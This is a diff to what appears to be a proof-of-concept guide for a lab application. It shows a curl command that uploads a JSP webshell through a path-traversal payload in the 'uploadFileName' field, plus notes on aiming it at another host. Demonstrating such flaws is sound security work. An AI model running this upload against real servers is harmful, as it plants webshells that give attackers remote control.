@@ -10,7 +10,9 @@ This guide will explain how to set-up and execute a PoC, please use it responsib
 2. Place the webshell.jsp file in the directory where you will perform the PoC (upload POST request in step 3).
 3. Execute the following curl command to make a POST request with the content of the webshell.jsp but modifying the parameter uploadFileName including the path traversal payload:
 
-`curl http://localhost:8080/UploadFileWeb/upload.action -F "Upload=@./webshell-advanced.jsp" -F "uploadFileName=../../path/to/webapp/dummy.jsp" --trace-ascii /dev/stdout`
+```
+curl http://localhost:8080/UploadFileWeb/upload.action -F "Upload=@./webshell-advanced.jsp" -F "uploadFileName=../../path/to/webapp/dummy.jsp" --trace-ascii /dev/stdout
+```
 
 **Note**: if you are performing the attack from another machine, make sure to put the correct IP and port where the application is running. In "uploadFileName", substitute /path/to/webapp/ with the actual path where your application serves files, e.g. if you are using Tomcat in Eclipse, this will be something like: /home/user/eclipse-workspace/UploadFileWeb/src/main/webapp/ 
 
